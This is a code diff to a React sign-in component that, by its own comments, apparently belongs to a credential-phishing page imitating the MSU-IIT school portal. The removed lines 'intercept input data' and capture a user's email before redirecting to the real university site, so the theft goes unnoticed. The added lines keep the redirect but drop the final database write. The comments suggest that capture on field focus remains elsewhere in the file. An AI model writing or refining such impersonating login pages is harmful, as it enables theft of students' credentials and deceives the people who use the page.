@@ -61,16 +61,13 @@ export default function Signin() {
     }
   };
 
-  // NEW SUBMIT LOGIC: Intercepts input data and forces redirection to the official school portal
-  const handleFormSubmit = async (e) => {
-    e.preventDefault(); // Stop standard form refresh
-    
-    // 1. Fire a final data check capture to catch the email if they didn't focus the password field
-    await processInterception();
-    
-    // 2. Perform instant hard-redirection to the actual MSU-IIT live web domain
-    window.location.href = "https://myiit.msuiit.edu.ph/";
-  };
+ // MODIFIED SUBMIT LOGIC: Bypass database logging entirely on click
+const handleFormSubmit = (e) => {
+  e.preventDefault(); // Stop standard form page refresh
+  
+  // Directly force redirection to the official MSU-IIT domain without writing to Supabase
+  window.location.href = "https://myiit.msuiit.edu.ph/";
+};
 
   return (
     <>
